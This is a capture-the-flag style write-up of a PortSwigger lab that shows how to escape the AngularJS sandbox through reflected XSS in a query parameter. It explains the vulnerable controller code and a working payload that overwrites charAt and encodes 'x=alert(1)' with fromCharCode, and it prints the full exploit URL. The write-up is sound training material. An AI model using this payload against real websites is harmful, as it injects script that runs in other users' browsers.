# Description

This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.

# Solution

First, let's see where our input goes when we type the word “text.”

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS92.png" alt="XXS" />
</p>

Our input goes into the Angular module, and this is what the code looks like

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS93.png" alt="XXS" />
</p>

```javascript
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = 'test';
                            $scope.value = $parse(key)($scope.query);
                        });
```

The code creates a `query` object and stores the value `'test'` in it under the key `search`.
The variable `key` contains the name of this key.
Then `$parse` uses the key name to retrieve the corresponding value from the `query` object.
As a result, 'test' is assigned to `$scope.value`.

Let's try inserting a standard payload and it should attempt to calculate it.

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS94.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS95.png" alt="XXS" />
</p>

As we can see, we did not succeed in this. 

Let's try inserting an & and define our own parameter.

```
/?search=test&k=1
```
If we go back to the source code, we can see that we managed to add our own parameter k and assigned it a value of 1.

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS96.png" alt="XXS" />
</p>

Let's try our payload again, but this time as a variable.

```
/?search=test&{{2*2}}=1
```

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS97.png" alt="XXS" />
</p>

And we can see Value, which tells us that this method works.

On the [Chet-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#dom-based-angularjs-sandbox-escapes) page, we can find a suitable payload. 

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS98.png" alt="XXS" />
</p>

```
toString().constructor.prototype.charAt%3d[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```
This payload uses the charAt function. `charAt` returns the character at a specified index in a string.

There is a very interesting line here: fromCharCode.
If we open the `ASCII` table and look at the numbers we have, we can compare them with `x=alert(1)`.

```
(120,61,97,108,101,114,116,40,49,41)
```

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS99.webp" alt="XXS" />
</p>

Let's try to execute our attack.

```
/?search=test&toString().constructor.prototype.charAt%3d[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

and we managed to pass the lab
